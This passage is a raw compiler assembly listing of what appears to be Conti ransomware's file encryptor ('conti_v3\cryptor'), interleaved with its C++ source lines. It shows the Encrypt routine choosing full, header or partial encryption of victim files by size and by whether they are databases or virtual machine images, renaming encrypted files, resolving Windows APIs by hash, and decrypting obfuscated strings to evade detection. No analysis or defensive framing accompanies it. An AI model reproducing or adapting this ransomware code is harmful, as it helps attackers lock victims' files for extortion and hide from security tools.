  0012a	c6 45 2b 27	 mov	 BYTE PTR $T2[rbp-5], 39	; 00000027H
  0012e	c6 45 2c 5f	 mov	 BYTE PTR $T2[rbp-4], 95	; 0000005fH
  00132	c6 45 2d 27	 mov	 BYTE PTR $T2[rbp-3], 39	; 00000027H
  00136	c6 45 2e 44	 mov	 BYTE PTR $T2[rbp-2], 68	; 00000044H
  0013a	c6 45 2f 27	 mov	 BYTE PTR $T2[rbp-1], 39	; 00000027H
  0013e	c6 45 30 39	 mov	 BYTE PTR $T2[rbp], 57	; 00000039H
  00142	c6 45 31 27	 mov	 BYTE PTR $T2[rbp+1], 39	; 00000027H
  00146	c6 45 32 73	 mov	 BYTE PTR $T2[rbp+2], 115 ; 00000073H
  0014a	c6 45 33 27	 mov	 BYTE PTR $T2[rbp+3], 39	; 00000027H
  0014e	c6 45 34 2d	 mov	 BYTE PTR $T2[rbp+4], 45	; 0000002dH
  00152	c6 45 35 27	 mov	 BYTE PTR $T2[rbp+5], 39	; 00000027H
  00156	c6 45 36 32	 mov	 BYTE PTR $T2[rbp+6], 50	; 00000032H
  0015a	c6 45 37 27	 mov	 BYTE PTR $T2[rbp+7], 39	; 00000027H
  0015e	c6 45 38 12	 mov	 BYTE PTR $T2[rbp+8], 18
  00162	c6 45 39 27	 mov	 BYTE PTR $T2[rbp+9], 39	; 00000027H
  00166	c6 45 3a 73	 mov	 BYTE PTR $T2[rbp+10], 115 ; 00000073H
  0016a	c6 45 3b 27	 mov	 BYTE PTR $T2[rbp+11], 39 ; 00000027H
  0016e	c6 45 3c 01	 mov	 BYTE PTR $T2[rbp+12], 1
  00172	c6 45 3d 27	 mov	 BYTE PTR $T2[rbp+13], 39 ; 00000027H
  00176	c6 45 3e 30	 mov	 BYTE PTR $T2[rbp+14], 48 ; 00000030H
  0017a	c6 45 3f 27	 mov	 BYTE PTR $T2[rbp+15], 39 ; 00000027H
  0017e	c6 45 40 30	 mov	 BYTE PTR $T2[rbp+16], 48 ; 00000030H
  00182	c6 45 41 27	 mov	 BYTE PTR $T2[rbp+17], 39 ; 00000027H
  00186	c6 45 42 0b	 mov	 BYTE PTR $T2[rbp+18], 11
  0018a	c6 45 43 27	 mov	 BYTE PTR $T2[rbp+19], 39 ; 00000027H
  0018e	c6 45 44 30	 mov	 BYTE PTR $T2[rbp+20], 48 ; 00000030H
  00192	c6 45 45 27	 mov	 BYTE PTR $T2[rbp+21], 39 ; 00000027H
  00196	c6 45 46 5f	 mov	 BYTE PTR $T2[rbp+22], 95 ; 0000005fH
  0019a	c6 45 47 27	 mov	 BYTE PTR $T2[rbp+23], 39 ; 00000027H
  0019e	c6 45 48 72	 mov	 BYTE PTR $T2[rbp+24], 114 ; 00000072H
  001a2	c6 45 49 27	 mov	 BYTE PTR $T2[rbp+25], 39 ; 00000027H
  001a6	c6 45 4a 5f	 mov	 BYTE PTR $T2[rbp+26], 95 ; 0000005fH
  001aa	c6 45 4b 27	 mov	 BYTE PTR $T2[rbp+27], 39 ; 00000027H
  001ae	c6 45 4c 48	 mov	 BYTE PTR $T2[rbp+28], 72 ; 00000048H
  001b2	c6 45 4d 27	 mov	 BYTE PTR $T2[rbp+29], 39 ; 00000027H
  001b6	c6 45 4e 65	 mov	 BYTE PTR $T2[rbp+30], 101 ; 00000065H
  001ba	c6 45 4f 27	 mov	 BYTE PTR $T2[rbp+31], 39 ; 00000027H
  001be	c6 45 50 55	 mov	 BYTE PTR $T2[rbp+32], 85 ; 00000055H
  001c2	c6 45 51 27	 mov	 BYTE PTR $T2[rbp+33], 39 ; 00000027H
  001c6	c6 45 52 27	 mov	 BYTE PTR $T2[rbp+34], 39 ; 00000027H
  001ca	c6 45 53 27	 mov	 BYTE PTR $T2[rbp+35], 39 ; 00000027H
  001ce	0f b6 45 f8	 movzx	 eax, BYTE PTR $T2[rbp-56]

; 58   :         return m_isDecrypted;

  001d2	0f b6 45 f7	 movzx	 eax, BYTE PTR $T2[rbp-57]

; 63   :         if (!isDecrypted())

  001d6	84 c0		 test	 al, al
  001d8	75 51		 jne	 SHORT $LN209@Encrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001da	33 ff		 xor	 edi, edi
  001dc	0f 1f 40 00	 npad	 4
$LL210@Encrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001e0	0f b6 4c 3d f8	 movzx	 ecx, BYTE PTR $T2[rbp+rdi-56]

; 40   :     return (a % n + n) % n;

  001e5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001ea	83 e9 27	 sub	 ecx, 39			; 00000027H
  001ed	6b c9 37	 imul	 ecx, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  001f0	f7 e9		 imul	 ecx
  001f2	03 d1		 add	 edx, ecx
  001f4	c1 fa 06	 sar	 edx, 6
  001f7	8b c2		 mov	 eax, edx
  001f9	c1 e8 1f	 shr	 eax, 31
  001fc	03 d0		 add	 edx, eax
  001fe	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00201	2b c8		 sub	 ecx, eax
  00203	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00208	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0020b	f7 e9		 imul	 ecx
  0020d	03 d1		 add	 edx, ecx
  0020f	c1 fa 06	 sar	 edx, 6
  00212	8b c2		 mov	 eax, edx
  00214	c1 e8 1f	 shr	 eax, 31
  00217	03 d0		 add	 edx, eax
  00219	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0021c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0021e	88 4c 3d f8	 mov	 BYTE PTR $T2[rbp+rdi-56], cl
  00222	48 ff c7	 inc	 rdi
  00225	48 83 ff 5c	 cmp	 rdi, 92			; 0000005cH
  00229	72 b5		 jb	 SHORT $LL210@Encrypt
$LN209@Encrypt:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1219 : 		logs::Write(OBFW(L"Can't gen key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  0022b	48 8b 13	 mov	 rdx, QWORD PTR [rbx]
  0022e	48 8d 4d f8	 lea	 rcx, QWORD PTR $T2[rbp-56]
  00232	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write
$LN2912@Encrypt:

; 1288 : }

  00237	33 c0		 xor	 eax, eax
$LN1@Encrypt:
  00239	4c 8d 9c 24 90
	00 00 00	 lea	 r11, QWORD PTR [rsp+144]
  00241	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  00245	49 8b 73 18	 mov	 rsi, QWORD PTR [r11+24]
  00249	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  0024d	4d 8b 73 28	 mov	 r14, QWORD PTR [r11+40]
  00251	49 8b e3	 mov	 rsp, r11
  00254	5d		 pop	 rbp
  00255	c3		 ret	 0
$LN2@Encrypt:

; 1220 : 		return FALSE;
; 1221 : 
; 1222 : 	}
; 1223 : 
; 1224 : 	if (!OpenFileEncrypt(FileInfo)) {

  00256	48 8b cb	 mov	 rcx, rbx
  00259	e8 00 00 00 00	 call	 ?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z ; OpenFileEncrypt
  0025e	85 c0		 test	 eax, eax
  00260	74 d5		 je	 SHORT $LN2912@Encrypt

; 1225 : 		return FALSE;
; 1226 : 	}
; 1227 : 
; 1228 : 	if (CheckForDataBases(FileInfo->Filename)) {

  00262	48 8b 0b	 mov	 rcx, QWORD PTR [rbx]
  00265	e8 00 00 00 00	 call	 ?CheckForDataBases@@YAHPEB_W@Z ; CheckForDataBases
  0026a	85 c0		 test	 eax, eax
  0026c	74 21		 je	 SHORT $LN4@Encrypt
$LN2934@Encrypt:

; 1273 : 
; 1274 : 		}
; 1275 : 
; 1276 : 	}
; 1277 : 
; 1278 : 	if (Result) {

  0026e	45 33 c0	 xor	 r8d, r8d
  00271	b2 24		 mov	 dl, 36			; 00000024H
  00273	48 8b cb	 mov	 rcx, rbx
  00276	e8 00 00 00 00	 call	 ?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ; WriteEncryptInfo
  0027b	85 c0		 test	 eax, eax
  0027d	74 b8		 je	 SHORT $LN2912@Encrypt
  0027f	48 8b d7	 mov	 rdx, rdi
  00282	48 8b cb	 mov	 rcx, rbx
  00285	e8 00 00 00 00	 call	 ?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ; EncryptFull
  0028a	e9 93 00 00 00	 jmp	 $LN2932@Encrypt
$LN4@Encrypt:

; 1229 : 
; 1230 : 		if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) {
; 1231 : 			return FALSE;
; 1232 : 		}
; 1233 : 
; 1234 : 		Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);
; 1235 : 
; 1236 : 	}
; 1237 : 	else if (CheckForVirtualMachines(FileInfo->Filename)) {

  0028f	48 8b 0b	 mov	 rcx, QWORD PTR [rbx]
  00292	e8 00 00 00 00	 call	 ?CheckForVirtualMachines@@YAHPEB_W@Z ; CheckForVirtualMachines
  00297	85 c0		 test	 eax, eax
  00299	74 18		 je	 SHORT $LN7@Encrypt

; 1238 : 
; 1239 : 		if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, 20)) {

  0029b	41 b0 14	 mov	 r8b, 20
  0029e	b2 25		 mov	 dl, 37			; 00000025H
  002a0	48 8b cb	 mov	 rcx, rbx
  002a3	e8 00 00 00 00	 call	 ?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ; WriteEncryptInfo
  002a8	85 c0		 test	 eax, eax
  002aa	74 8b		 je	 SHORT $LN2912@Encrypt

; 1240 : 			return FALSE;
; 1241 : 		}
; 1242 : 
; 1243 : 		Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, 20);

  002ac	c6 44 24 20 14	 mov	 BYTE PTR [rsp+32], 20

; 1244 : 
; 1245 : 	}

  002b1	eb 5e		 jmp	 SHORT $LN2933@Encrypt
$LN7@Encrypt:

; 1246 : 	else {
; 1247 : 
; 1248 : 		if (FileInfo->FileSize <= 1048576) {

  002b3	48 8b 43 10	 mov	 rax, QWORD PTR [rbx+16]
  002b7	48 3d 00 00 10
	00		 cmp	 rax, 1048576		; 00100000H
  002bd	7e af		 jle	 SHORT $LN2934@Encrypt

; 1249 : 
; 1250 : 			if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) {
; 1251 : 				return FALSE;
; 1252 : 			}
; 1253 : 
; 1254 : 			Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);
; 1255 : 
; 1256 : 		}
; 1257 : 		else if (FileInfo->FileSize <= 5242880) {

  002bf	48 8b cb	 mov	 rcx, rbx
  002c2	48 3d 00 00 50
	00		 cmp	 rax, 5242880		; 00500000H
  002c8	7f 25		 jg	 SHORT $LN13@Encrypt

; 1258 : 
; 1259 : 			if (!WriteEncryptInfo(FileInfo, HEADER_ENCRYPT, 0)) {

  002ca	45 33 c0	 xor	 r8d, r8d
  002cd	b2 26		 mov	 dl, 38			; 00000026H
  002cf	e8 00 00 00 00	 call	 ?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ; WriteEncryptInfo
  002d4	85 c0		 test	 eax, eax
  002d6	0f 84 5b ff ff
	ff		 je	 $LN2912@Encrypt

; 1260 : 				return FALSE;
; 1261 : 			}
; 1262 : 
; 1263 : 			Result = EncryptHeader(FileInfo, Buffer, CryptoProvider, PublicKey);

  002dc	4c 8b ce	 mov	 r9, rsi
  002df	4d 8b c6	 mov	 r8, r14
  002e2	48 8b d7	 mov	 rdx, rdi
  002e5	48 8b cb	 mov	 rcx, rbx
  002e8	e8 00 00 00 00	 call	 ?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ; EncryptHeader

; 1264 : 
; 1265 : 		}

  002ed	eb 33		 jmp	 SHORT $LN2932@Encrypt
$LN13@Encrypt:

; 1266 : 		else {
; 1267 : 
; 1268 : 			if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, global::GetEncryptSize())) {

  002ef	44 0f b6 05 00
	00 00 00	 movzx	 r8d, BYTE PTR ?g_EncryptSize@@3EA ; g_EncryptSize
  002f7	b2 25		 mov	 dl, 37			; 00000025H
  002f9	e8 00 00 00 00	 call	 ?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ; WriteEncryptInfo
  002fe	85 c0		 test	 eax, eax
  00300	0f 84 31 ff ff
	ff		 je	 $LN2912@Encrypt

; 1269 : 				return FALSE;
; 1270 : 			}
; 1271 : 
; 1272 : 			Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, global::GetEncryptSize());

  00306	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?g_EncryptSize@@3EA ; g_EncryptSize
  0030d	88 44 24 20	 mov	 BYTE PTR [rsp+32], al
$LN2933@Encrypt:

; 1273 : 
; 1274 : 		}
; 1275 : 
; 1276 : 	}
; 1277 : 
; 1278 : 	if (Result) {

  00311	4c 8b ce	 mov	 r9, rsi
  00314	4d 8b c6	 mov	 r8, r14
  00317	48 8b d7	 mov	 rdx, rdi
  0031a	48 8b cb	 mov	 rcx, rbx
  0031d	e8 00 00 00 00	 call	 ?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z ; EncryptPartly
$LN2932@Encrypt:
  00322	8b f0		 mov	 esi, eax
  00324	85 c0		 test	 eax, eax
  00326	74 2d		 je	 SHORT $LN2911@Encrypt

; 1279 : 
; 1280 : 		pCloseHandle(FileInfo->FileHandle);

  00328	48 8b 7b 08	 mov	 rdi, QWORD PTR [rbx+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  0032c	ba 0f 00 00 00	 mov	 edx, 15
  00331	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  00337	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  0033b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00340	48 8b cf	 mov	 rcx, rdi
  00343	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1282 : 		ChangeFileName(FileInfo->Filename);

  00345	48 8b 0b	 mov	 rcx, QWORD PTR [rbx]
  00348	48 c7 43 08 ff
	ff ff ff	 mov	 QWORD PTR [rbx+8], -1
  00350	e8 00 00 00 00	 call	 ?ChangeFileName@cryptor@@YAHPEB_W@Z ; cryptor::ChangeFileName
$LN2911@Encrypt:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00355	33 c0		 xor	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1293 : 	RtlSecureZeroMemory(FileInfo->ChachaKey, 32);

  00357	48 8d 7b 60	 lea	 rdi, QWORD PTR [rbx+96]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0035b	b9 20 00 00 00	 mov	 ecx, 32			; 00000020H
  00360	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1294 : 	RtlSecureZeroMemory(FileInfo->ChachaIV, 8);

  00362	48 8d 7b 58	 lea	 rdi, QWORD PTR [rbx+88]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00366	b9 08 00 00 00	 mov	 ecx, 8
  0036b	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1296 : 	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE) {

  0036d	48 8b 7b 08	 mov	 rdi, QWORD PTR [rbx+8]
  00371	48 83 ff ff	 cmp	 rdi, -1
  00375	74 1f		 je	 SHORT $LN2092@Encrypt
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  00377	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  0037a	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  00380	44 8d 48 5b	 lea	 r9d, QWORD PTR [rax+91]
  00384	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00389	48 8b cf	 mov	 rcx, rdi
  0038c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1299 : 		FileInfo->FileHandle = INVALID_HANDLE_VALUE;

  0038e	48 c7 43 08 ff
	ff ff ff	 mov	 QWORD PTR [rbx+8], -1
$LN2092@Encrypt:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00396	33 c0		 xor	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1303 : 	RtlSecureZeroMemory(FileInfo->EncryptedKey, 524);

  00398	48 8d bb 80 00
	00 00		 lea	 rdi, QWORD PTR [rbx+128]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0039f	b9 0c 02 00 00	 mov	 ecx, 524		; 0000020cH
  003a4	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1287 : 	return Result;

  003a6	8b c6		 mov	 eax, esi
  003a8	e9 8c fe ff ff	 jmp	 $LN1@Encrypt
?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z ENDP	; cryptor::Encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z
_TEXT	SEGMENT
FileInfo$ = 48
?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z PROC		; cryptor::CloseFile, COMDAT

; 1292 : {

$LN14:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b d9	 mov	 rbx, rcx

; 1293 : 	RtlSecureZeroMemory(FileInfo->ChachaKey, 32);

  0000d	48 8d 79 60	 lea	 rdi, QWORD PTR [rcx+96]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00011	33 c0		 xor	 eax, eax
  00013	b9 20 00 00 00	 mov	 ecx, 32			; 00000020H
  00018	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1294 : 	RtlSecureZeroMemory(FileInfo->ChachaIV, 8);

  0001a	48 8d 7b 58	 lea	 rdi, QWORD PTR [rbx+88]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0001e	b9 08 00 00 00	 mov	 ecx, 8
  00023	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1296 : 	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE) {

  00025	48 8b 7b 08	 mov	 rdi, QWORD PTR [rbx+8]
  00029	48 83 ff ff	 cmp	 rdi, -1
  0002d	74 1f		 je	 SHORT $LN2@CloseFile
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  0002f	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00032	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  00038	44 8d 48 5b	 lea	 r9d, QWORD PTR [rax+91]
  0003c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00041	48 8b cf	 mov	 rcx, rdi
  00044	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1299 : 		FileInfo->FileHandle = INVALID_HANDLE_VALUE;

  00046	48 c7 43 08 ff
	ff ff ff	 mov	 QWORD PTR [rbx+8], -1
$LN2@CloseFile:

; 1300 : 
; 1301 : 	}
; 1302 : 
; 1303 : 	RtlSecureZeroMemory(FileInfo->EncryptedKey, 524);

  0004e	48 8d bb 80 00
	00 00		 lea	 rdi, QWORD PTR [rbx+128]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00055	33 c0		 xor	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1304 : }

  00057	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0005c	b9 0c 02 00 00	 mov	 ecx, 524		; 0000020cH
  00061	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1304 : }

  00063	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00067	5f		 pop	 rdi
  00068	c3		 ret	 0
?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z ENDP		; cryptor::CloseFile
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 5c 00 00
	00		 mov	 r11d, 92		; 0000005cH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 27	 sub	 ecx, 39			; 00000027H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
